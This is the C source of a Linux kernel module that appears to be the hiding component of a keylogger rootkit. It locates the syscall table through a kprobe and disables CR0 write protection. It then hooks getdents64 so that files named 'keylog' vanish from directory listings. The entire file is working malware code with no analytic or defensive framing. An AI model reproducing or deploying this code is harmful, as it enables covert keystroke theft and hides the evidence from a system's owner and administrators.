#include <asm/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>

#include "include/sys_calls.h"

#define FILENAME "keylog"

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef asmlinkage long (*getdents_t)(const struct pt_regs *);

static getdents_t orig_getdents64 = NULL;
static unsigned long *syscall_table = NULL;

asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	int ret = 0;

	struct linux_dirent64 *curr_dir = NULL;
	struct linux_dirent64 *dirent_ker = NULL;
	struct linux_dirent64 *prev_dir = NULL;
	unsigned long offset = 0;

	ret = orig_getdents64(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);

	if (ret <= 0 || dirent_ker == NULL) {
		return ret;
	}

	if (copy_from_user(dirent_ker, dirent, ret)) {
		goto out;
	}

	while (offset < ret) {
		curr_dir = (void *)dirent_ker + offset;

		if (memcmp(FILENAME, curr_dir->d_name, strlen(FILENAME)) == 0) {
			if (curr_dir == dirent_ker) {
				ret -= curr_dir->d_reclen;
				memmove(curr_dir, (void *)curr_dir + curr_dir->d_reclen, ret);
				continue;
			}
			prev_dir->d_reclen += curr_dir->d_reclen;
		} else {
			prev_dir = curr_dir;
		}
		offset += curr_dir->d_reclen;
	}

	if (copy_to_user(dirent, dirent_ker, ret) != 0) {
		goto out;
	}

out:
	kfree(dirent_ker);
	return ret;
}

static unsigned long *get_syscall_table(void) {
	int ret = 0;
	unsigned long *sct = NULL;
	kallsyms_lookup_name_t lookup_name = NULL;
	struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name"
	};

	ret = register_kprobe(&kp);
	if (ret < 0) {
		return NULL;
	}

	unregister_kprobe(&kp);
	
	lookup_name = (kallsyms_lookup_name_t)kp.addr;
	sct = (unsigned long *)lookup_name("sys_call_table");
	return sct;
}

static inline void _write_cr0(unsigned long val) {
	__asm__ __volatile__("mov %0, %%cr0": "+r"(val));
}

static void disable_write_protection(void) {
	unsigned long val = read_cr0();
	val &= (~0x10000);
	_write_cr0(val);
}

static void enable_write_protection(void) {
	unsigned long val = read_cr0();
	val |= 0x10000;
	_write_cr0(val);
}

int sys_calls_init(void) {
	int rc = 0;

	disable_write_protection();

	syscall_table = get_syscall_table();
	if (syscall_table == NULL) {
		rc = -1;
		goto out;
	}
	orig_getdents64 = (getdents_t)syscall_table[__NR_getdents64];
	syscall_table[__NR_getdents64] = (long unsigned int)hooked_getdents64;

out:
	enable_write_protection();
	return rc;
}

void sys_calls_cleanup(void) {
	disable_write_protection();

	syscall_table[__NR_getdents64] = (long unsigned int)orig_getdents64;

	enable_write_protection();
}

